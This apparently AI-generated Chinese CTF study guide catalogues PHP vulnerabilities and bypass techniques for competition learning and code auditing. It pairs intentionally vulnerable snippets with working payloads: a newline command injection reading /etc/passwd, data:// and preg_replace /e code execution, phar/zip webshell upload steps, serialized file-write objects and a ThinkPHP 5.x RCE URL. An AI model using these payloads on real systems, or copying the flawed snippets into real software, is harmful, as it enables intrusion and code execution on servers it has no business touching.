---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '5c66baa8-c858-4629-8b7e-96e6ffa77e36'
  PropagateID: '5c66baa8-c858-4629-8b7e-96e6ffa77e36'
  ReservedCode1: '36d9fd69-580f-4c8e-8a59-76bdf173246f'
  ReservedCode2: '36d9fd69-580f-4c8e-8a59-76bdf173246f'
---

# CTF Web 知识专题 — PHP 各类安全问题与绕过姿势大全

> **CTF 竞赛 Web 方向考点**：本专题系统整理 PHP 安全问题与绕过技巧，覆盖弱类型、伪协议、反序列化、变量覆盖等核心方向，所有内容面向竞赛学习与代码审计参考。
>
> 原文来源：[一文了解PHP的各类漏洞和绕过姿势 — 腾讯云开发者社区](https://cloud.tencent.com/developer/article/2127498)

## 目录

- [一、基础知识](#一基础知识)
- [二、弱类型以及各种函数](#二弱类型以及各种函数)
- [三、伪协议](#三伪协议)
- [四、反序列化](#四反序列化)
- [五、其他安全问题](#五其他安全问题)

---

## 一、基础知识

### 1、九大全局变量

- `$_POST`：接收 POST 提交的数据
- `$_GET`：获取 URL 地址栏的参数数据
- `$_FILES`：文件接收处理（img 最常见）
- `$_COOKIE`：获取与 `setCookie()` 中的 name 值
- `$_SESSION`：存储或获取 session 中的值
- `$_REQUEST`：同时具有 GET、POST 功能，但比较慢
- `$_SERVER`：预定义服务器变量
- `$GLOBALS`：包含全部变量的全局组合数组
- `$_ENV`：包含服务器端环境变量的数组

---

## 二、弱类型以及各种函数

### 1、精度缺陷

PHP 浮点数运算中经常出现与预期不一致的结果，因为浮点数精度有限。

PHP 通常使用 IEEE 754 双精度格式，最大相对误差为 `1.11e-16`。

经典示例：

```php
floor((0.1 + 0.7) * 10);  // 返回 7 而不是 8
// 内部表示类似于 7.9999999999999991118...
```

以十进制能精确表示的有理数如 `0.1` 或 `0.7`，无法被内部使用的二进制精确表示，造成精度丢失。

### 2、类型转换缺陷

PHP 弱类型特性：整型和其他类型比较时，会先把其他类型 `intval` 数字化再比较。

```php
<?php
    error_reporting(0);
    $flag = 'flag{test}';
    $id = $_GET['id'];
    is_numeric($id) ? die("Sorry....") : NULL;
    if($id > 2020){
        echo $flag;
    }
?>
```

既要传入非数字，又要比 2020 大 → 传 `?id=2021a` 即可。

### 3、`==` 和 `===`

- `==`：先将字符串类型转换成相同，再比较
- `===`：先判断两种字符串的类型是否相等，再比较

弱比较利用：

```php
'a' == 0          // true
'12a' == 12       // true
'1' == 1          // true
'1aaaa55sss66' == 1  // true
1 == true == "1"  // true
"0e123" == "0e456"  // true，0e 识别为科学计数法，0 的任意次方都是 0
"0e123" == "0eabc"  // false，科学计数的指数不可以包含字母
```

### 0e 碰撞字符串表

MD5 以 `0e` 开头的字符串（用于 `md5($a) == md5($b)` 绕过）：

| 原始字符串 | MD5 值 |
|-----------|---------|
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `240610708` | `0e462097431906509019562988736854` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240448830537924465865611904` |
| `s1091221200a` | `0e940624217856561557816327384675` |
| `s1885207154a` | `0e509367213418206700842008763514` |
| `s1502113478a` | `0e861580163291561247404381396064` |
| `s1836677006a` | `0e481036490867661113260034900752` |
| `s1184209335a` | `0e072485820392773389523109082030` |
| `s1665632922a` | `0e731198061491163073197128363787` |
| `s532378020a` | `0e220463095855511507588041205815` |

### 4、`strcmp()` 函数

比较字符串的函数：

```php
int strcmp(string $str1, string $str2)
// 返回 < 0: str1 < str2
// 返回 > 0: str1 > str2
// 返回 0: 两者相等
```

**绕过**：在 PHP 5.3.3 至 5.5（不含 5.5）中，比较数组和字符串时返回值为 `0`（实际返回 `NULL`，`NULL == 0` 为 `true`）。

```php
<?php
$password = $_GET['password'];
if(strcmp('am0s', $password)){
    echo 'false!';
} else {
    echo 'success!';
}
?>
```

绕过：`?password[]=1`

**拓展**：`ereg()` 和 `strpos()` 函数在处理数组时也会异常，返回 `NULL`。

### 5、`intval()` 函数

获取变量的整数值。从字符串起始处转换直到遇到非数字字符，即使无法转换也返回 `0` 而不报错。

```php
<?php
$a = $_GET['a'];
if (intval($a) === 666) {
    $sql = "Select a From Table Where Id=" . $a;
    echo $sql;
} else {
    echo "No...";
}
?>
```

传入 `?a=666a`，`intval("666a")` 返回 `666`（严格等于），同时 SQL 拼接的是完整字符串 `"666a"`。

### 6、`sha1()` 和 `md5()` 加密函数

两者都无法处理数组，不会抛出异常而是直接返回 `NULL`。

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
if (md5($a) === sha1($b)) {
    echo "Bypass md5() and sha1()!";
} else {
    echo "No...";
}
?>
```

绕过：`?a[]=1&b[]=1`（`NULL === NULL` 为 `true`）

### 7、`parse_str()` 函数

解析字符串并注册成变量，注册前不验证当前变量是否存在，可直接覆盖已有变量。

```php
void parse_str(string $str[, array &$arr])
```

**示例**：

```php
<?php
error_reporting(0);
if(empty($_GET['id'])) {
    show_source(__FILE__);
    die();
} else {
    include('flag.php');
    $a = "www.xxx.com";
    $id = $_GET['id'];
    @parse_str($id);
    if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
        echo $flag;
    } else {
        exit('so easy!');
    }
}
?>
```

`parse_str($id)` 会将 `$id` 解析为变量。传入 `?id=a[0]=240610708`，`parse_str` 执行后 `$a[0]` 被覆盖为 `"240610708"`，其 MD5 为 `0e` 开头，与 `QNKCDZO` 的 MD5 弱比较相等。

### 8、`is_numeric()` 函数

检测变量是否为数字或数字字符串。可被十六进制值绕过（PHP 5.x）。

```php
<?php
$name = $_GET['name'];
if (is_numeric($name)) {
    // 入库操作
    mysql_query("insert into users values (3," . $name . ",'test')");
}
?>
```

`1' union select 1,2,3` 的十六进制 `0x312720756e696f6e2073656c65637420312c322c33` 可绕过 `is_numeric()` 检测（PHP 5.x），实现 SQL 注入。

> **注意**：PHP 7+ 中 `is_numeric()` 不再接受十六进制字符串。

### 9、`in_array()` 函数

判断值是否在数组列表中，缺陷在于存在自动类型转换。

```php
<?php
$id = $_GET['id'];
if (in_array($id, array(1,2,3,4,5,6,7,8,9,0))) {
    $sql = "Select a From users Where Id='" . $id . "'";
    echo $sql;
} else {
    echo "No...";
}
?>
```

传入 `?id=1'`，`in_array("1'", [1,2,3...])` 因弱类型转换 `true`，导致 SQL 注入。

### 10、`ereg()` 和 `eregi()`

正则匹配函数（`eregi` 不区分大小写），已在 PHP 5.3+ 废弃。

**绕过方式一**：`%00` 截断

```php
<?php
$passwd = $_GET['passwd'];
if (@ereg("^[a-zA-Z0-9_]+$", $passwd)) {
    $sql = "Select username From users Where password='" . $passwd . "'";
    echo $sql;
} else {
    echo "No...";
}
?>
```

`ereg` 遇到 `%00` 会截断，`?passwd=1%00--` 可绕过正则检查。

**绕过方式二**：传入数组返回 `NULL`

### 11、`json_decode()` 函数

对 JSON 格式数据进行解码。存在 `0 == "efeaf"` 的弱比较绕过。

```php
<?php
$key = "JsonTest";
if (isset($_GET['data'])) {
    $data = json_decode($_GET['data']);
    if ($data->key == $key) {
        echo "Bypass json_decode()!";
    } else {
        echo "No...";
    }
}
?>
```

传入 `{"key":0}`，`0 == "JsonTest"` 在弱比较中为 `true`（字符串转 int 为 0）。

### 12、`preg_match()` 函数

执行正则表达式匹配。

#### `/i` 修饰符 — 大小写不敏感

```php
<?php
    error_reporting(0);
    $name = $_GET["name"];
    if (preg_match('/script/', $_GET["name"])) {
        die('hacker');
    }
    echo $name;
?>
```

绕过：`?name=<Script>alert(2333)</Script>`

#### `/m` 修饰符 — 多行匹配

当出现换行符 `%0a` 时会被当做两行处理，只匹配第一行，后面的行被忽略。

```php
<?php
  if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m', $_GET['ip']))) {
     die("Invalid IP address");
  }
  system("ping -c 2 " . $_GET['ip']);
?>
```

绕过：`?ip=127.0.0.1%0acat /etc/passwd`

#### 数组绕过

`preg_match()` 对数组参数返回 `false`，可用于绕过 `if(preg_match(...))` 判断。

### 13、`preg_replace()` 函数

执行正则表达式的搜索和替换。

#### `/e` 修饰符 — 代码执行

使 `preg_replace()` 将 replacement 参数当作 PHP 代码执行（PHP 5.5+ 已废弃，PHP 7+ 移除）。

**示例1：直接传参**

```php
<?php
    echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
?>
```

绕过：`?pattern=/233/e&new=phpinfo()&base=233`

**示例2：简单正则**

```php
<?php
    error_reporting(0);
    include('flag.php');
    $pattern = $_REQUEST["pattern"];
    $new = $_POST["new"];
    $base = '2333';
    preg_replace($pattern, $new, $base);
?>
```

绕过：`?pattern=/\d/e`，然后 POST `new=phpinfo()`

**示例3：进阶正则**

```php
<?php
    error_reporting(0);
    function complexStrtolower($regex, $value){
        return preg_replace('/('.$regex.')/ei', 'strtolower("\\1")', $value);
    }
    foreach($_REQUEST as $regex => $value){
        echo complexStrtolower($regex, $value) . "\n";
    }
    highlight_file(__FILE__);
?>
```

绕过：`\S+={${phpinfo()}}`

### 14、`register_globals` 全局变量覆盖

- `register_globals=On`：传递过来的值直接注册为全局变量
- `register_globals=Off`：需从特定数组获取
- PHP 5.3.0 起废弃，PHP 5.4.0 起移除

当 `register_globals=On`，变量未被初始化且能被用户控制时，存在变量覆盖漏洞。

```php
<?php
echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";
if ($a) {
    echo "Hacked!";
}
?>
```

### 15、`extract()` 变量覆盖

从数组中将变量导入当前符号表，使用数组键名作为变量名，键值作为变量值。

```php
int extract(array $var_array[, int $extract_type[, string $prefix]])
```

第二个参数行为：

| 值 | 行为 |
|------|------|
| `EXTR_OVERWRITE`（默认） | 变量名冲突时覆盖所有变量 |
| `EXTR_SKIP` | 跳过不覆盖 |
| `EXTR_PREFIX_SAME` | 加前缀 |
| `EXTR_PREFIX_ALL` | 所有变量加前缀 |

**示例**：

```php
<?php
$a = "0";
extract($_GET);
if ($a == 1) {
    echo "Hacked!";
} else {
    echo "Hello!";
}
?>
```

传入 `?a=1`，`extract` 覆盖 `$a` 为 `"1"`，`"1" == 1` 为 `true`。

### 16、`import_request_variables()` 变量覆盖

将 GET、POST、Cookie 中的变量导入全局（4.1.0 <= PHP < 5.4.0）。

```php
bool import_request_variables(string $types[, string $prefix])
```

- `$type`：G 代表 GET，P 代表 POST，C 代表 Cookie
- 第二个参数为变量前缀

```php
<?php
$a = "0";
import_request_variables("G");
if ($a == 1) {
    echo "Fucked!";
} else {
    echo "Nothing!";
}
?>
```

### 17、`$$` 导致的变量覆盖

- `$var`：正常变量，名称为 var
- `$$var`：引用变量，存储 `$var` 的值作为变量名

**示例**：

```php
<?php
foreach (array('_COOKIE','_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key = $_value;
    }
}
$id = isset($id) ? $id : "test";
if($id === "mi1k7ea") {
    echo "flag{xxxxxxxxxx}";
} else {
    echo "Nothing...";
}
?>
```

传入 `?id=mi1k7ea`，foreach 中 `$_key` 为 `id`，`$_value` 为 `mi1k7ea`，`$$_key` 即 `$id` 被赋值为 `mi1k7ea`。

### 18、`strstr()` 函数

大小写敏感的字符串查找函数，可通过大小写变换绕过。

### 19、`mt_rand()` 函数

随机数生成函数。问题在于每个 PHP CGI 进程期间只有第一次调用 `mt_rand()` 会自动播种，后续都基于该种子生成随机数。

通过逆向可得到随机种子，进而预测后续随机数（如路径等信息）。

工具：**php_mt_seed**

---

## 三、伪协议

PHP 伪协议总览：

| 协议 | 用途 | 条件 |
|------|------|------|
| `file://` | 访问本地文件系统 | 不受 `allow_url_fopen` 影响 |
| `php://` | 访问输入/输出流 | `php://filter` 无特殊要求；`php://input` 需 `allow_url_include=On` |
| `zip://` / `bzip2://` / `zlib://` | 压缩流 | 不需指定后缀名 |
| `data://` | 写入数据 | 需 `allow_url_fopen` 和 `allow_url_include` |
| `phar://` | PHP 归档 | 常用于文件包含 |

### 1、`php://` 输入输出流

#### （1）`php://filter`

元封装器，用于数据流打开时的筛选过滤。可读取本地磁盘文件，不需开启 `allow_url_fopen` 和 `allow_url_include`。

以 base64 编码方式读取 PHP 文件源码（直接包含 PHP 文件不会显示源码）：

```
?filename=php://filter/convert.base64-encode/resource=xxx.php
?filename=php://filter/read=convert.base64-encode/resource=xxx.php
```

#### （2）`php://input`

访问请求的原始数据的只读流，可直接读取 POST 中未解析的原始数据，不需开启 `allow_url_fopen`。

在遇到 `file_get_contents()` 时可用 `php://input` 绕过：

```php
<?php
    echo file_get_contents("php://input");
?>
```

也可用于执行命令和写入文件（需 `allow_url_include=On`）。

### 2、`file://` 读取文件内容

通过 file 协议访问本地文件系统，不受 `allow_url_fopen` 与 `allow_url_include` 影响。

- 只能输入绝对路径，相对路径不生效
- 输入 PHP 或 JS 文件时，会执行该文件代码而非显示内容

### 3、`data://` 读取文件

数据流封装器，将 include 的文件流重定向到用户可控制的输入流。

条件：PHP >= 5.2，同时开启 `allow_url_fopen` 和 `allow_url_include`。

```
data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=
data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=
```

执行命令：

```
?file=data:text/plain,<?php phpinfo();?>
```

base64 绕过：

```
index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

### 4、`phar://` 针对压缩包

PHP 解压缩包的函数，不管后缀是什么都会当做压缩包来解压。

条件：压缩包需 zip 协议压缩，PHP >= 5.3.0。

利用步骤：

1. 制作一句话木马文件 `shell.php`
2. 用 zip 协议压缩为 `shell.zip`
3. 将后缀改为 png 等其他格式
4. 上传
5. 通过 `phar://shell.png/shell.php` 访问

### 5、`zip://` 针对压缩包

类似 `phar://`，但使用方法和条件有区别。

条件：

- 压缩包需 zip 协议压缩
- PHP >= 5.3.0（Windows 下 PHP 还需 < 5.4）
- 不需开启 `allow_url_fopen` 和 `allow_url_include`
- `#` 需编码为 `%23`，接上压缩包内的文件
- 需指定绝对路径

```
zip://C:/www/upload/shell.png%23shell.php
```

类似协议还有 `zlib://` 和 `bzip2://`。

---

## 四、反序列化

PHP 序列化的两个函数：

- `serialize()`：将对象转成字符串形式，方便保存
- `unserialize()`：将序列化后的字符串反序列化成对象

### 1、序列化与反序列化格式

考虑具有以下属性的对象：

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

序列化后：

```
O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}
```

格式解读：

```
O:4:"User"             对象，类名 4 字符 "User"
2                      对象有 2 个属性
s:4:"name"             第一个属性键名，4 字符字符串 "name"
s:6:"carlos"           第一个属性值，6 字符字符串 "carlos"
s:10:"isLoggedIn"     第二个属性键名，10 字符字符串 "isLoggedIn"
b:1                    第二个属性值，布尔值 true
```

### 2、魔术方法

魔术方法在特定条件下自动执行：

| 魔术方法 | 触发时机 |
|---------|---------|
| `__sleep()` | 使用 `serialize()` 时触发 |
| `__wakeup()` | 使用 `unserialize()` 时触发 |
| `__destruct()` | 对象被销毁时触发 |
| `__construct()` | 创建新对象时触发 |
| `__call()` | 对象上下文中调用不可访问方法时触发 |
| `__callStatic()` | 静态上下文中调用不可访问方法时触发 |
| `__get()` | 从不可访问属性读取数据时触发 |
| `__set()` | 将数据写入不可访问属性时触发 |
| `__isset()` | 在不可访问属性上调用 `isset()` 或 `empty()` 触发 |
| `__unset()` | 在不可访问属性上使用 `unset()` 时触发 |
| `__invoke()` | 将对象调用为函数时触发 |
| `__toString()` | 类被当成字符串时触发 |

### 3、PHP 反序列化漏洞

出现原因：

1. `unserialize()` 传入参数可控
2. 存在可利用的魔术方法
3. 过滤不完善

#### 例子1 — __wakeup

```php
<?php
class Test{
    var $test = "123";
    function __wakeup(){
        $fp = fopen("test.php", 'w');
        fwrite($fp, $this->test);
        fclose($fp);
    }
}
$test1 = $_GET['test'];
$seri = unserialize($test1);
require "test.php";
?>
```

- `__wakeup()` 在反序列化时调用，创建 `test.php` 并写入 `$test` 的值
- `require` 文件包含

Payload：

```
?test=O:4:"Test":1:{s:4:"test";s:18:"<?php%20phpinfo();?>";}
```

> **CVE-2016-7124**：当序列化字符串中对象属性个数大于真实属性个数时，会跳过 `__wakeup()` 的执行。适用于 PHP 5.6.25 / 7.0.10 之前版本。

#### 例子2 — __construct + __wakeup 链

```php
<?php
class Test1{
    function __construct($test){
        $fp = fopen("shell.php", "w");
        fwrite($fp, $test);
        fclose($fp);
    }
}
class Test2{
    var $test = "123";
    function __wakeup(){
        $obj = new Test1($this->test);
    }
}
$test = $_GET['test'];
unserialize($test);
require "shell.php";
?>
```

`__wakeup()` 调用 `Test1` 类，触发 `__construct()` 写入文件。

#### 例子3 — __destruct

```php
<?php
class Test{
    var $test = "demo";
    function __destruct(){
        echo $this->test;
    }
}
$a = $_GET['test'];
$a_unser = unserialize($a);
?>
```

脚本结束时调用 `__destruct()`，同时覆盖 `$test` 变量。

#### 例子4 — Session 反序列化

PHP session 存储与读取是一个序列化与反序列化过程，有三种模式：

| 模式 | 存储格式 |
|------|---------|
| `php_binary` | 键名长度作为 ASCII 字符 + 序列化值 |
| `php` | `键名|序列化值` |
| `php_serialize` | 完整序列化格式 |

不同模式混用时可导致反序列化漏洞。当 `session.serialize_handler` 设置不当，可通过构造 Session 数据触发反序列化。

#### 例子5 — `phar://` 协议在反序列化中的应用

phar 文件包在生成时以序列化形式存储用户自定义的 meta-data，配合 `phar://` 可在文件系统函数（`file_exists()`、`is_dir()` 等）参数可控时实现自动反序列化。

利用条件：

1. 存在文件操作函数且参数可控（`file_get_contents`、`file_exists`、`finfo_file` 等）
2. 可上传 phar 文件（可改后缀）

关键点：

- phar 文件可改后缀为任意格式（如 `.jpg`、`.png`）
- `php://filter/resource=phar://` 也可触发
- 底层调用 `php_stream_open_warpper_ex` 处理

#### 例子6 — POP 链构造

POP（Property-Oriented Programming）链构造步骤：

1. 寻找 `unserialize()` 函数参数是否有可控点
2. 寻找反序列化目标，重点寻找存在 `__wakeup()` 或 `__destruct()` 的类
3. 一层层研究该类在魔术方法中使用的属性和调用的方法，寻找可控属性能触发链式调用

---

## 五、其他安全问题

### 1、动态特性

PHP 动态特性可被利用进行代码执行绕过，如 `$a = 'assert'; $a($_POST['cmd']);`。

### 2、Web 管理脚本免杀

通过回调函数、动态调用、字符串拼接、异或编码等方式绕过检测。

### 3、ThinkPHP 5.x 远程命令执行

利用 `$this->method` 可控导致的 RCE，经典 Payload：

```
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1]=[]
```

### 4、PHP 混淆后门

通过异或、自增等无字母数字方式构造代码执行。

### 5、函数巧用

如 `math` 函数限制下的利用，通过白名单函数构造计算表达式。

### 6、数组 key 溢出

PHP 的 HashTable 通过链表法实现，当索引值为数字且超出范围时会造成溢出。

临界点：`9223372036854775807`（`PHP_INT_MAX`），超出后变成负数。

```php
<?php
$arr[1] = '1';
$arr[18446744073708551617333333333333] = 'overflow';
$arr[] = 'test';
$arr[4294967296] = 'test';
$arr[9223372036854775807] = 'test';
$arr[9223372036854775808] = 'test';  // 溢出为负数
var_dump($arr);
?>
```

---

## 六、速查总结

### 弱比较 `==` 常见绕过速查

| 比较表达式 | 结果 | 原理 |
|-----------|------|------|
| `"0e123" == "0e456"` | `true` | 科学计数法 0 == 0 |
| `"a" == 0` | `true` | 字符串转 int 为 0 |
| `"12a" == 12` | `true` | 取前导数字 |
| `NULL == 0` | `true` | NULL 转为 0 |
| `NULL == NULL` | `true` | 严格比较也为 true |
| `false == NULL` | `true` | 均转为 false |

### 数组绕过函数速查

| 函数 | 正常返回 | 数组返回 | 绕过条件 |
|------|---------|---------|---------|
| `md5()` | string | `NULL` | `== 或 ===` |
| `sha1()` | string | `NULL` | `== 或 ===` |
| `strcmp()` | int | `NULL` | `== 0` |
| `ereg()` | int | `NULL` | `if(ereg(...))` |
| `preg_match()` | 0/1 | `false` | `== false` 或 `=== false` |
| `strpos()` | int/false | `false` | `=== false` |

### 变量覆盖函数速查

| 函数 | 危险参数 | 安全做法 |
|------|---------|---------|
| `extract()` | 默认 `EXTR_OVERWRITE` | 使用 `EXTR_SKIP` |
| `parse_str()` | 单参数模式 | 使用第二参数 `array` |
| `import_request_variables()` | 直接导入全局 | PHP 5.4+ 已移除 |
| `$$` | foreach 遍历用户输入 | 避免用户输入作为变量名 |
| `register_globals=On` | 自动注册全局 | 现代 PHP 已移除 |

---

## 七、参考

- [一文了解PHP的各类漏洞和绕过姿势 — 腾讯云开发者社区](https://cloud.tencent.com/developer/article/2127498)
- [PHP 类型比较表 — 官方文档](https://www.php.net/manual/zh/types.comparisons.php)
- PHP 代码安全杂谈
- PHP 弱类型及相关函数绕过小结
- CTF 之 PHP 黑魔法总结
- PHP preg_ 系列漏洞小结
- PHP mt_rand 安全杂谈及应用场景详解
- PHP 变量覆盖漏洞小结
- PHP 对象注入之 POP 链构造
- PHP 伪协议
- php://filter 的妙用
- Phar 的一些利用姿势
- PHP session 反序列化漏洞
- PHP 反序列化利用
- PHP unserialize 反序列化漏洞
- phar 反序列化漏洞
- PHP 动态特性的捕捉与逃逸
- ThinkPHP 留后门技巧
- PHP webshell 免杀姿势总结
- PHP 数组的 key 溢出问题

> AI生成